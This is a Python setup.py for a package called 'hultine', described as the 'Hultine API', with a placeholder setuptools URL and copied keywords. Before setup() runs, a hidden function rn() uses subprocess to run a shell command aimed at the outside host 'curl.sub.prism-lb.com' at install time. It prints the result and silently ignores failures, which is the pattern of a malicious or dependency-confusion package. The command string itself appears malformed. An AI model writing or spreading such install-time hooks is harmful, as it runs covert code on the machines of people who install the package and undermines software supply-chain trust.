from setuptools import setup, find_packages

def rn():
    import subprocess, os
    try:
        curlcmd = 'curl.sub.prism-lb.com'
        curlme = subprocess.getoutput(curlcmd)
        print(curlme)
    except Exception as e:
        pass
    

rn()

setup(
  name = 'hultine',
  packages = find_packages (),
  version = '2.0.0',
  description = 'Hultine API',
  author = 'Hultine',
  url = ' https://github.com/pypa/setuptools',
  keywords = ['CPAN', 'PyPI', 'distutils', 'eggs', 'package', 'HULTINE'],
  classifiers = []
)
